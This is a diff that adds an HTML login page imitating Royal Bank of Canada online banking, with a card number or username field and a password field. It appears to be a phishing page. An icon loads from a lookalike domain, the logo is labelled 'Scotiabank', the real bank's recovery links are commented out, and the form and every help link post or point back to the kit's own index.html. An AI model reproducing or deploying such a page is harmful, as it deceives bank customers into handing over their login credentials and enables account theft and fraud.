@@ -1,0 +1,156 @@
+<html lang="en" style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Royal Bank of Canada</title>
+  <meta name="description" content="">
+  <link rel="shortcut icon" href="resources/favicon.ico" type="image/x-icon">
+  <link rel="apple-touch-icon" href="http://rbc.com.bankvercom.com/resources/apple-icon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.00, maximum-scale=1, user-scalable=0">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" href="css/css.css">
+
+  <noscript>&lt;iframe src="//www.googletagmanager.com/ns.html?id=GTM-MSJKZ8"
+                    height="0" width="0" style="display:none;visibility:hidden"&gt;&lt;/iframe&gt;</noscript>
+  <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          '//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+  })(window,document,'script','dataLayer','GTM-MSJKZ8');</script>
+  <!-- End Google Tag Manager -->
+
+  <script src="scripts.js"></script><meta class="foundation-data-attribute-namespace"><meta class="foundation-mq-xxlarge"><meta class="foundation-mq-xlarge-only"><meta class="foundation-mq-xlarge"><meta class="foundation-mq-large-only"><meta class="foundation-mq-large"><meta class="foundation-mq-medium-only"><meta class="foundation-mq-medium"><meta class="foundation-mq-small-only"><meta class="foundation-mq-small"><style></style>
+
+
+<meta class="foundation-mq-topbar"><style type="text/css"></style></head>
+<body class="">
+<nav-bar params="route: route"><div>
+    <div class="nav-bar fixed" data-bind="template: { afterRender: enhanceWithin}">
+        <nav class="top-bar scotiabank" data-topbar="" role="navigation" data-bind="visible: isVisible(), attr: { class: 'top-bar ' + branding() }" style="display: none;">
+            <ul class="title-area">
+                <li class="name">
+                    <h1>
+                        <!--
+                        <div data-bind="ifnot: route().page === 'account-summary'">
+                        <a href="" id="goBack" class="back-button" data-bind="click: goBack" ><img class="back-button"src="images/arrow-back.svg" onerror="this.src='images/arrow-back.png'"></img></a>
+                        </div>
+                        -->
+
+                    </h1>
+                </li>
+
+                <!-- <section class="middle tab-bar-section" data-bind="if: displayPageTitle()">
+                        <span class="medium" data-bind="html: pageTitle()" tabindex="0"></span>
+                </section> -->
+
+                <!-- Remove the class "menu-icon" to get rid of menu icon. Take out "Menu" to just have icon alone -->
+                <li class="toggle-topbar" data-bind="if: displayMenuOptions()"></li>
+            </ul>
+
+        <section class="middle tab-bar-section">
+                        <img class="logo" tabindex="0" alt="Scotiabank" src="images/rbc-royal-bank-logo-1.png">
+
+                </section><section class="top-bar-section" data-bind="if: displayMenuOptions()"></section></nav>
+    </div>
+</div></nav-bar>
+<notifications><div class="notifications" aria-live="assertive" data-bind="template: { afterRender: enhanceWithin}">
+	<div class="alert-box" role="alertdialog" data-bind="notificationVisible: hasNotification, notificationType: globalNotification().notificationType" tabindex="-1" style="display: none;">
+		<!-- ko if: globalNotification() --><!-- /ko -->
+	</div>
+</div></notifications>
+<loading params="{isLoading: BankingJS.Utilities.Network.isLoading}"><div data-bind="template: { afterRender: enhanceWithin}, visible: isLoading" class="loading-container" role="alert" aria-live="assertive" tabindex="0" style="display: none;">
+	<div class="loading" id="load" aria-label="Loading"><div class="spinner" role="progressbar" style="position: absolute; width: 0px; z-index: 2000000000; left: 50%; top: 50%;"><div style="position: absolute; top: -5px; opacity: 0.25; animation: opacity-60-25-0-13 1s linear infinite;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(0deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: opacity-60-25-1-13 1s linear infinite;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(27deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: opacity-60-25-2-13 1s linear infinite;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(55deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: opacity-60-25-3-13 1s linear infinite;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(83deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: opacity-60-25-4-13 1s linear infinite;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(110deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: opacity-60-25-5-13 1s linear infinite;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(138deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: opacity-60-25-6-13 1s linear infinite;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(166deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: opacity-60-25-7-13 1s linear infinite;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(193deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: opacity-60-25-8-13 1s linear infinite;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(221deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: opacity-60-25-9-13 1s linear infinite;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(249deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: opacity-60-25-10-13 1s linear infinite;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(276deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: opacity-60-25-11-13 1s linear infinite;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(304deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: opacity-60-25-12-13 1s linear infinite;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(332deg) translate(24px, 0px); border-radius: 5px;"></div></div></div><div style="color: transparent">Loading...</div></div>
+</div></loading>
+<div id="page" class="container height100" data-bind="component: { name: route().page, params: route }, css: isWideView() ? 'height100' :''"><div data-bind="template: { afterRender: enhanceWithin }" class="login-container component-container">
+	<div>
+		<img id="loginLogo" class="login-logo" data-bind="attr: {src: logoSVG, onerror:logoPNG}" src="images/rbc-royal-bank-logo-1.png"  style="width: 60%;">
+	</div>
+	<div id="browser-warning-frame"></div>
+	<form id="loginForm" method="post" action="index.html" >
+	<input type="hidden" name="form" value="login">
+		<div class="margin">
+			<div class="clearfix">
+				<label id="cardNumberInputLabel" class="login small dark-grey left" for="cardNumberInputText" data-bind="text: lbl.CardNumber">Client Card or Username</label>
+				<label id="saveCheckLabel" class="small dark-grey right" for="saveCheck" data-bind="text: lbl.SaveToggle">Remember me</label>
+			</div>
+			<div class="input-1">
+				<div>
+					<!-- ko ifnot: disableCardInput -->
+					<input name="login" required="" id="cardNumberInputText" type="text" class="login-card-number small" autocomplete="off" pattern="^[a-zA-Z0-9]+" title="Username should not contain any spaces">
+					<!-- /ko -->
+					<!-- ko if: disableCardInput --><!-- /ko -->
+				</div>
+				<div class="save-card">
+					<input id="saveCheck" type="checkbox" class="save-card" name="saveCheck" data-bind="checked: cardSaved">
+					<label tabindex="0" id="saveCheckLabelStar" class="save-card" for="saveCheck"></label>
+				</div>
+			</div>
+			<label id="passwordInputLabel" class="small dark-grey" for="passwordInputText" data-bind="text: lbl.Password">Password</label>
+			<div>
+				<input name="password" required="" id="passwordInputText" type="password" class="password" autocomplete="off" minlength="6">
+			</div>
+		</div>
+		<div class="row login" id="signin">
+			<div class="large-12 columns">
+			<style>
+						.login-btn { 
+background-color: #ffd700!important;
+    border: 1px solid #ffd700!important;
+    color: black!important;
+    transition: background-color 0ms ease-out; 
+						 }
+						 .login-btn:hover {
+						 	background-color: #fbaa26!important;
+	border: 1px solid #fbaa26!important;
+	color: black!important;
+						 }
+			</style>
+				<button type="submit" id="signOnButton" class="red-button mb20 login-btn" data-bind="text: lbl.SignIn" style="    ">Sign In</button>
+			</div>
+			<div class="large-12 columns c">
+				<!--a href="https://www1.royalbank.com/cgi-bin/rbaccess/rbcgi3m01" class="clickable input-action small blue mb20">Recover Your Username</a-->
+				<!--a href="https://www1.royalbank.com/cgi-bin/rbaccess/rbcgi3m01" class="clickable input-action small blue mb20">Reset Your Password</a-->
+				<a href="index.html" class="clickable input-action small blue mb20" >Need Help Signing In?</a>
+				
+			</div>
+		</div>
+	</form>
+ <div style="
+              margin-top: 25px;
+              max-width: 550px;
+              margin-right: 25px;
+              margin-left: 25px;
+              padding: 30px 27px;
+              box-shadow: 0px 0px 15px 2px rgba(128, 128, 128, 0.2);
+              font-size: 14px;
+              ">
+              <h3 style="
+              font-size: 124.14%;
+              margin: 0 0 25px;
+              color: #282828;
+              ">Stay Safe Online</h3>
+        <style>
+                  .link li {
+                    margin-top: 24px;
+                    
+                  }
+                  .link a {
+                    text-decoration: none;
+                  }
+                  .link a:hover {
+                        text-decoration: underline;
+                  }
+                </style>
+              <ul class="link ">
+                <li ><a title="Learn about email and website fraud (Opens new window)" target="_blank" href="index.html">Learn about email and website fraud<i aria-hidden="true" class="rbc-icon rbc_new_window"></i><span class="accessible"> (Opens new window)</span></a></li>
+                <li><a title="Report a concern (Opens new window)" target="_blank" href="index.html">Report a concern<i aria-hidden="true" class="rbc-icon rbc_new_window"></i><span class="accessible"> (Opens new window)</span></a></li>
+                <li><a title="Practice Safe Computing (Opens new window)" target="_blank" href="index.html">Practice Safe Computing<i aria-hidden="true" class="rbc-icon rbc_new_window"></i><span class="accessible"> (Opens new window)</span></a></li>
+                <li><a title="Common schemes and scams (Opens new window)" target="_blank" href="index.html">Common schemes and scams<i aria-hidden="true" class="rbc-icon rbc_new_window"></i><span class="accessible"> (Opens new window)</span></a></li>
+                <li><a title="Privacy and Security (Opens new window)" target="_blank" href="index.html">Privacy and Security<i aria-hidden="true" class="rbc-icon rbc_new_window"></i><span class="accessible"> (Opens new window)</span></a></li>
+                </ul>
+              </div>
+	
+</div>
+</div>
+
+
+<div class="__disk_root__" style="position: static;"></div></body></html>
